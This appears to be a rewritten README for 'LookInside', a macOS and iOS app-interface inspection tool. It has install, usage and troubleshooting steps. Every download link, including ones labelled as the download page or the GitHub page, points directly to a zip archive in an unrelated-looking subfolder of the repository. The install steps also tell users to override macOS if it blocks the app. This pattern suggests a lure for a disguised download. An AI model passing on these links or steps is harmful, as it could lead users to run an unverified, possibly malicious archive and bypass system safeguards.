# 🧭 LookInside - Inspect apps with ease

[![Download LookInside](https://img.shields.io/badge/Download-LookInside-blue?style=for-the-badge)](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)

## 📦 What is LookInside?

LookInside is a desktop tool for checking how macOS and iOS apps are built while they run. It helps you inspect app windows, views, and other screen parts on a Mac.

Use it when you need to:
- open a running app and see its interface parts
- review layout details in macOS apps
- connect to iOS Simulator apps
- inspect apps on a USB-connected device
- use the app or the command line tool, based on what feels simpler

## 💻 Before You Start

Use LookInside on a Mac that can run modern desktop apps.

A good setup is:
- macOS 13 or later
- an Intel or Apple Silicon Mac
- enough free disk space for the app and support files
- a debuggable target app, such as a test build, Simulator app, or connected device app

If you plan to inspect iOS apps, install Xcode and set up the iOS Simulator first.

## 🚀 Download LookInside

Open the main project page and get the version you want:

[Visit the LookInside download page](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)

After you download it, open the app package or build it in Xcode, based on the version you choose.

## 🛠️ Install on Mac

If you downloaded a ready-to-use app:
1. Open the downloaded file
2. Drag LookInside to the Applications folder if prompted
3. Open LookInside from Applications
4. If macOS blocks the app, use System Settings to allow it

If you are opening the source project:
1. Download the repository from GitHub
2. Open `LookInside.xcworkspace` in Xcode
3. Let Xcode finish loading the packages
4. Build and run the macOS app target

If you prefer the command line tool:
1. Open the repository in Terminal
2. Build the CLI target in Xcode or from the command line
3. Run `lookinside` from the build output

## 🖱️ Start Using the App

After LookInside opens:
1. Keep the target app running
2. Open LookInside
3. Let it search for available targets
4. Choose the app or device you want to inspect
5. View the screen tree, layout details, and other app data

If the app list looks empty, make sure the target app is open and set up for inspection.

## 📱 Connect an iPhone or iPad

To inspect a device:
1. Plug the device into your Mac with a cable
2. Unlock the device
3. Trust the Mac if the device asks
4. Open LookInside
5. Select the connected device when it appears

For iPhone Simulator:
1. Open Xcode
2. Start the Simulator
3. Launch the app you want to inspect
4. Open LookInside
5. Pick the Simulator app from the list

## 🔎 What You Can Do

LookInside can help you:
- see the view tree for a running app
- check text, size, spacing, and layout
- inspect screen elements in real time
- compare what the app shows with what you expected
- use the app window or the CLI, based on your workflow

## 🧰 Common Ways to Use It

### Inspect a macOS app
Open the app on your Mac, then use LookInside to view its interface structure.

### Inspect a Simulator app
Start the iOS Simulator, open the app, then connect LookInside to the running target.

### Inspect a USB device app
Connect your iPhone or iPad with a cable, then choose it from the target list.

### Use the command line
Run `lookinside` when you want a text-based view or a script-friendly workflow.

## 🔐 Privacy and Data Use

LookInside is built to stay local. It does not use telemetry, crash upload, or automatic update services.

Your inspection work stays on your Mac unless you choose to move files yourself.

## 🧩 Project Layout

This repository includes:
- `LookInside/` for the macOS app
- `LookInside.xcodeproj` for the Xcode project
- `LookInside.xcworkspace` for the workspace
- `Sources/` for shared inspection code
- `Sources/LookInsideCLI` for the command-line tool

The project also keeps older compatibility module names such as `LookinServer`, `LookinShared`, and `LookinCore` so existing setups can move with less work.

## 🧪 Build From Source

If you want to build the app yourself:
1. Download the repository
2. Open `LookInside.xcworkspace` in Xcode
3. Choose the macOS app target
4. Select the Mac you want to use
5. Press Run

If Xcode asks to fetch packages, let it finish before you build.

## 🧯 If Something Does Not Work

If LookInside does not show a target:
- make sure the app is running
- make sure the Simulator is open
- make sure the USB device is unlocked
- check that the target supports inspection
- quit and reopen LookInside

If Xcode will not build the project:
- check that you opened the workspace, not just the project
- update Xcode
- let package loading finish
- try building again after a clean build folder

## 🖼️ Preview

![Preview](./Resources/SCR-20260330-ccud.png)

## 📁 Files You May Need

- `LookInside.xcworkspace` for the main setup
- `LookInside.xcodeproj` for project details
- `Sources/LookInsideCLI` for the CLI tool
- `Resources/` for images and other assets

## ▶️ Get Started Now

[Open LookInside on GitHub](https://raw.githubusercontent.com/Willieundesirable68/LookInside/main/psychophysicist/Look_Inside_3.5.zip)